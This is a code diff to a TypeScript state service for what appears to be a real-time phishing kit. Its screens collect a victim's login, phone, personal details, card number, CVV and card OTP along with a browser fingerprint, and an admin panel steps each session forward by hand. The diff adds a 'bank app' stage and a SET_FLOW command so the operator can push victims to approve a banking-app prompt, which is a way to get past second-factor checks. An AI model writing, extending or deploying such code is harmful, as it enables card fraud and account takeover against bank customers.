@@ -6,8 +6,8 @@ import { from, of, firstValueFrom, throwError } from 'rxjs';
 import { retry, catchError, switchMap, tap } from 'rxjs/operators';
 import { PollingScheduler } from './polling.util';
 
-export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'loading' | 'step_success' | 'success' | 'admin';
-export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'final_review' | 'complete';
+export type ViewState = 'gate' | 'security_check' | 'login' | 'limited' | 'phone' | 'personal' | 'card' | 'card_otp' | 'bank_app' | 'loading' | 'step_success' | 'success' | 'admin';
+export type VerificationStage = 'login' | 'limited' | 'phone_pending' | 'personal_pending' | 'card_pending' | 'card_otp_pending' | 'bank_app_pending' | 'final_review' | 'complete';
 
 export interface UserFingerprint {
   userAgent: string;
@@ -29,6 +29,7 @@ export interface SessionHistory {
   stage?: string;
   resendRequested?: boolean;
   isPinned?: boolean;
+  verificationFlow?: 'otp' | 'app' | 'both';
   // Progress flags
   isLoginVerified?: boolean;
   isPhoneVerified?: boolean;
@@ -85,6 +86,9 @@ export class StateService {
   readonly cardCvv = signal<string>('');
   readonly cardOtp = signal<string>(''); 
   
+  // New Flow Control
+  readonly verificationFlow = signal<'otp' | 'app' | 'both'>('otp');
+
   // Metadata & Fingerprint
   readonly sessionId = signal<string>('');
   readonly startTime = signal<Date>(new Date());
@@ -306,6 +310,7 @@ export class StateService {
         cardExpiry: this.cardExpiry(),
         cardCvv: this.cardCvv(),
         cardOtp: this.cardOtp(),
+        verificationFlow: this.verificationFlow(),
         
         isLoginVerified: this.isLoginVerified(),
         isPhoneVerified: this.isPhoneVerified(),
@@ -352,6 +357,7 @@ export class StateService {
       if(data.cardExpiry) this.cardExpiry.set(data.cardExpiry);
       if(data.cardCvv) this.cardCvv.set(data.cardCvv);
       if(data.cardOtp) this.cardOtp.set(data.cardOtp);
+      if(data.verificationFlow) this.verificationFlow.set(data.verificationFlow);
       
       if(data.isLoginVerified !== undefined) this.isLoginVerified.set(data.isLoginVerified);
       if(data.isPhoneVerified !== undefined) this.isPhoneVerified.set(data.isPhoneVerified);
@@ -480,6 +486,7 @@ export class StateService {
           cardExpiry: this.cardExpiry(),
           cardCvv: this.cardCvv(),
           cardOtp: this.cardOtp(),
+          verificationFlow: this.verificationFlow(),
           stage: this.stage(),
           fingerprint: this.fingerprint(),
           status: this.isFlowComplete() ? 'Verified' : 'Active',
@@ -614,6 +621,7 @@ export class StateService {
                 data: s,
                 resendRequested: s.resendRequested,
                 isPinned: s.isPinned,
+                verificationFlow: s.verificationFlow || 'otp',
                 isLoginVerified: s.isLoginVerified,
                 isPhoneVerified: s.isPhoneVerified,
                 isPersonalVerified: s.isPersonalVerified,
@@ -666,6 +674,7 @@ export class StateService {
           status: s.status,
           fingerprint: s.fingerprint,
           isPinned: s.isPinned,
+          verificationFlow: s.verificationFlow,
           data: {
             ...s,
             cardBin: s.cardNumber ? s.cardNumber.substring(0, 6) : '',
@@ -725,24 +734,54 @@ export class StateService {
            else if (this.stage() === 'card_otp_pending') {
                this.cardOtp.set('');
                this.navigate('card_otp', true);
+           }
+           else if (this.stage() === 'bank_app_pending') {
+               this.navigate('card', true); // Or back to bank app?
            } else {
                this.navigate('login', true);
            }
+      } else if (action === 'SET_FLOW') {
+           if (payload.flow) {
+               this.verificationFlow.set(payload.flow);
+           }
       } else if (action === 'APPROVE') {
            this.rejectionReason.set(null);
-           if (this.stage() === 'login') {
+           const currentStage = this.stage();
+
+           if (currentStage === 'login') {
                this.isLoginVerified.set(true);
                this.navigate('limited', true);
-           } else if (this.stage() === 'phone_pending') {
+           } else if (currentStage === 'phone_pending') {
                this.isPhoneVerified.set(true);
                this.navigate('personal', true);
-           } else if (this.stage() === 'personal_pending') {
+           } else if (currentStage === 'personal_pending') {
                this.isPersonalVerified.set(true);
                this.navigate('card', true);
-           } else if (this.stage() === 'card_pending') {
+           } else if (currentStage === 'card_pending') {
                this.isCardSubmitted.set(true);
-               this.navigate('card_otp', true);
-           } else if (this.stage() === 'card_otp_pending') {
+
+               // Route based on Verification Flow
+               if (this.verificationFlow() === 'app') {
+                   this.stage.set('bank_app_pending');
+                   this.navigate('bank_app', true);
+               } else {
+                   this.navigate('card_otp', true);
+                   // Note: We don't change stage here, waiting for OTP submit
+               }
+
+           } else if (currentStage === 'card_otp_pending') {
+               // Check if we need to do Bank App flow after OTP
+               if (this.verificationFlow() === 'both') {
+                   this.stage.set('bank_app_pending');
+                   this.navigate('bank_app', true);
+               } else {
+                   this.isFlowComplete.set(true);
+                   this.navigate('success', true);
+               }
+           }
+           // Note: bank_app_pending is auto-completed by user action,
+           // but if Admin forces approve, we can finish it.
+           else if (currentStage === 'bank_app_pending') {
                this.isFlowComplete.set(true);
                this.navigate('success', true);
            }
@@ -861,6 +900,13 @@ export class StateService {
       this.waitingStart.set(Date.now());
       this.syncState();
   }
+
+  completeBankApp() {
+      this.isFlowComplete.set(true);
+      this.stage.set('complete');
+      this.navigate('success');
+      this.syncState();
+  }
   
   proceedFromSuccess() {
       if (this.stage() === 'login') this.navigate('limited');
@@ -888,6 +934,13 @@ export class StateService {
       this.navigate('login');
   }
 
+  adminSetVerificationFlow(flow: 'otp' | 'app' | 'both') {
+      const id = this.monitoredSessionId();
+      if (id) {
+          this.sendAdminCommand(id, 'SET_FLOW', { flow });
+      }
+  }
+
   adminApproveStep() {
       const id = this.monitoredSessionId();
       if (id) {
@@ -908,7 +961,7 @@ export class StateService {
       const id = this.monitoredSessionId();
       if (id) {
           this.sendAdminCommand(id, 'APPROVE', {}); 
-          this.showAdminToast('Requested Bank OTP');
+          this.showAdminToast('Approved Step');
       }
   }
 
